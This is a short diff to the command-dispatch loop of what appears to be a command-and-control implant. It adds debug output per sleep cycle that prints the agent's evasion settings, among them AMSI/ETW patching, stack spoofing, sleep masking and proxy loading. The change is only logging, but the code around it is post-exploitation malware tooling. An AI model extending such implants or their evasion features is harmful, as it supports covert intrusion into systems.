@@ -56,11 +56,25 @@ VOID CommandDispatcher( VOID )
     UINT32   TaskBufferSize = { 0 };
     UINT32   CommandID      = { 0 };
     UINT32   RequestID      = { 0 };
+    UINT32   CycleNum       = 0;
 
     PRINTF( "Session ID => %x\n", Instance->Session.AgentID );
 
     do {
+        CycleNum++;
+        PUTS( "============================================================" )
+        PRINTF( "===== SLEEP CYCLE %u START | Sleep=%dms Jitter=%d%% Technique=%d ProxyLoad=%d AmsiEtw=%d StackSpoof=%d =====\n",
+                CycleNum,
+                Instance->Config.Sleeping,
+                Instance->Config.Jitter,
+                Instance->Config.Implant.SleepMaskTechnique,
+                Instance->Config.Implant.ProxyLoading,
+                Instance->Config.Implant.AmsiEtwPatch,
+                Instance->Config.Implant.StackSpoof )
+        PUTS( "============================================================" )
+
         if ( ! Instance->Session.Connected ) {
+            PUTS( "CommandDispatcher: session disconnected, exiting loop" )
             break;
         }
 
@@ -175,6 +189,7 @@ VOID CommandDispatcher( VOID )
         /* push any new clients or output from the sockets */
         SocketPush();
 
+        PRINTF( "===== SLEEP CYCLE %u END =====\n\n", CycleNum )
     } while ( TRUE );
 
     Instance->Session.Connected = FALSE;
